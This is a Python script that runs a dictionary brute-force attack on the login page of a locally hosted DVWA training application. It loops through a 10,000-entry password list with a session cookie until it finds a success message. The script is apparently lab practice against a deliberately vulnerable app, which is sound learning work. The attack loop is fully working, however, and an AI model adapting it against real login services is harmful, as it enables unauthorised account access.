import requests


# Payload URL form "http://localhost/vulnerabilities/brute/?username={username}&password={password}"
def crackDVWABruteforcePlayground(username: str, phpSessionID: str) -> None:

    try:
        password_filepath = "resource\credentials_top_10k.txt"
        trying_count = 1

        with open(password_filepath, "r") as file:
            lines = file.readlines()

            for line in lines:
                password = line.strip()
                print(f"[~] Conducting bruteforcing {trying_count} times for user @{username} => {password}")

                # Prepare and send payload
                url = "http://localhost/vulnerabilities/brute/"
                params = {
                    "username": username,
                    "password": password,
                    "Login"   : "Login" }
                cookie = {
                    "security": "low",
                    "PHPSESSID": phpSessionID }

                response = requests.get(url, params=params, cookies=cookie)
                trying_count += 1

                # Check if the request was successful (status code 200)
                if response.status_code == 200:
                    if "Welcome to the password protected" in response.text:
                        print(f"[!] Found an exact password for user @{username} => \"{password}\"")
                        break
                else:
                    print(f"[X] Request failed with status code: {response.status_code}")
                    return


    except FileNotFoundError:
        print(f"File not found: {password_filepath}")
    except Exception as exception:
        print(f"An error occurred: {exception}")

if __name__ == "__main__":
    # Prepare two parameters
    # - ID(str) of the account that you targeted
    # - PHPSESSID(str) of your local DVWA account
    crackDVWABruteforcePlayground("admin", "t8g6kc743kqs4t0e05srgion46")
